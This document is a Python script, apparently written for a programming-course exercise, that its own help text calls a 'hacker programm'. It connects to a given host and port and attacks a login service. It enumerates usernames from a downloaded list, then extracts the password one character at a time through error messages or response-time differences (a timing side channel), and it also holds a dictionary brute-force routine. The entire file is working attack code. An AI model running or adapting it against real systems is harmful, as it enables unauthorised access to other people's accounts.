import argparse
import itertools
import urllib.request
import socket
import string
import json
import time


def pass_generator(max_pass_size_):
    for i_ in range(1,max_pass_size_):
        for pass_ in itertools.product(string.digits + string.ascii_lowercase, repeat=i_):
            yield "".join(pass_)


def vulns_generator(start_string_):
    alphabet_ = string.digits + string.ascii_lowercase + string.ascii_uppercase
    for i_ in range(1, len(alphabet_)):
        for pass_ in itertools.product([start_string_], alphabet_):
            yield "".join(pass_)


def dict_generator():
    for password_ in load_passwords():
        for variant_ in map(lambda x: ''.join(x), itertools.product(*([l.lower(), l.upper()] for l in password_))):
            yield variant_


def load_passwords():
    with urllib.request.urlopen("https://stepik.org/media/attachments/lesson/255258/passwords.txt") as f:
        variants_ = f.read().decode('utf-8')
    return variants_.split("\r\n")


def load_logins():
    with urllib.request.urlopen("https://stepik.org/media/attachments/lesson/255258/logins.txt") as f:
        variants_ = f.read().decode('utf-8')
    return variants_.split("\r\n")


def find_logins(client_socket_):
    login_ = None
    for variant_ in load_logins():
        json_var_ = json.dumps({"login": variant_, "password": " "})
        client_socket_.send(json_var_.encode())
        response_ = client_socket_.recv(1024)
        response_ = response_.decode()
        if response_ == '{"result": "Wrong password!"}':
            login_ = variant_
            break
    return login_


def hack_vulns(hostname_, port_):
    pass_ = None
    max_pass_size_ = 8
    start_string_ = ""
    next_find_ = False
    pass_find_ = False
    with socket.socket() as client_socket_:
        address_ = (hostname_, port_)
        client_socket_.connect(address_)
        login_ = find_logins(client_socket_)
        for i_ in range(0, max_pass_size_):
            if pass_find_:
                break
            next_find_ = False
            for variant_ in vulns_generator(start_string_):
                if next_find_:
                    break
                json_var_ = json.dumps({"login": login_, "password": variant_})
                client_socket_.send(json_var_.encode())
                response_ = client_socket_.recv(1024)
                response_ = response_.decode()
                result_ = json.loads(response_)["result"]
                if result_ == "Exception happened during login":
                    start_string_ = variant_
                    next_find_ = True
                if result_ == "Connection success!":
                    pass_ = json_var_
                    pass_find_ = True
                    next_find_ = True
            if not next_find_:
                print("Can't find password")
                break
    if not pass_find_:
        print("Can't find password")
    else:
        print(pass_)


def time_vulns(hostname_, port_):
    pass_ = None
    max_pass_size_ = 8
    start_string_ = ""
    next_find_ = False
    pass_find_ = False
    with socket.socket() as client_socket_:
        address_ = (hostname_, port_)
        client_socket_.connect(address_)
        login_ = find_logins(client_socket_)
        for i_ in range(0, max_pass_size_):
            if pass_find_:
                break
            next_find_ = False
            for variant_ in vulns_generator(start_string_):
                if next_find_:
                    break
                json_var_ = json.dumps({"login": login_, "password": variant_})
                start_ = time.perf_counter()
                client_socket_.send(json_var_.encode())
                response_ = client_socket_.recv(1024)
                end_ = time.perf_counter()
                total_time_ = end_ - start_
                response_ = response_.decode()
                result_ = json.loads(response_)["result"]
                if total_time_ > 0.09:
                    start_string_ = variant_
                    next_find_ = True
                if result_ == "Connection success!":
                    pass_ = json_var_
                    pass_find_ = True
                    next_find_ = True
            if not next_find_:
                print("Can't find password")
                break
    if not pass_find_:
        print("Can't find password")
    else:
        print(pass_)


def brute(hostname_, port_):
    with socket.socket() as client_socket:
        address_ = (hostname_, port_)
        client_socket.connect(address_)
        pass_ = None
        # for variant_ in pass_generator(8):
        for variant_ in dict_generator():
            client_socket.send(variant_.encode())
            response_ = client_socket.recv(1024)
            response_ = response_.decode()
            if response_ == "Connection success!":
                pass_ = variant_
                break
        print(pass_ if pass_ else "Too many attempts")


parser = argparse.ArgumentParser(description="This is hacker programm.")
parser.add_argument("host")
parser.add_argument("port")
args = parser.parse_args()
host = args.host
port = int(args.port)
time_vulns(host, port)
# brute(host, port)
